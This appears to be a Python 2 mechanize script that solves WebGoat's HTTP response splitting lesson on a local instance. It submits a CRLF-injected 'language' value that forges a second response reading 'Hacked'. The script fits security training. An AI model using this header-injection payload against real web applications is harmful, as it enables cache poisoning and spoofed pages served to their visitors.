#!/usr/bin/env python

import mechanize
import cookielib


#Cookie Jar can be used to handle the cookies returned in the http reponse.

br = mechanize.Browser()
cj = cookielib.LWPCookieJar()
br.set_cookiejar(cj)

#some browser options.

br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

# User-Agent 
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

#Authentication for the site.
br.add_password('http://127.0.0.1:8080/WebGoat/attack', 'guest', 'guest')
response = br.open('http://127.0.0.1:8080/WebGoat/attack')
br.select_form(name="form")
br.submit()

for link in br.links():
	if "Splitting" in  link.text:
		new_link = br.click_link(link)
		br.open(new_link)
		br.select_form(name="form")
		br.form.enctype = "application/x-www-form-urlencoded"
		br.form['language'] = 'en%0d%0dContent-Length:0%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0aLast-Modified: Mon, 27 Oct 2090 14:50:18 GMT%0d%0aContent-Length:31%0d%0a<html>Hacked</html>'
		br.submit()
		print br.response().read()
